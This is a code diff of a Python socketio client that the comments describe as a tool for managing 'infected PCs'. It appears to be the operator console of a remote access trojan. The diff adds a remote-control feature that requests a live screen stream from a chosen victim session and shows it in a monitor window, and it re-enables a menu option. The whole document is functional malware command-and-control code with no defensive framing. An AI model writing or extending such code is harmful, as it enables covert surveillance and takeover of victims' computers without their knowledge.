@@ -1,6 +1,7 @@
 import socketio
 from pyfiglet import Figlet
 import os
+import cv2
 
 f = Figlet(font='slant')
 
@@ -33,10 +34,24 @@ def main():
     elif a == 'exit':
       sio.disconnect()
       exit()
-    # elif a == '2':
-    #   print("개발중..")
+    elif a == '2':
+      print("개발중..")
 
 
+
+# 원격조종
+def remote():
+  global isWhile
+  isWhile = False
+  cv2.namedWindow('monitor')
+  sio.emit('remote req', {'target': target['sid']})
+@sio.on('stream')
+def stream(data):
+  src = cv2.cvtColor(data['src'], cv2.COLOR_RGB2BGR)
+  cv2.imshow('monitor', src)
+
+  if cv2.waitKey(1) == 27:
+    sio.emit('stop remote', {'target': target['sid']})
 
 
 # 감염된 pc 정보들 가져오기
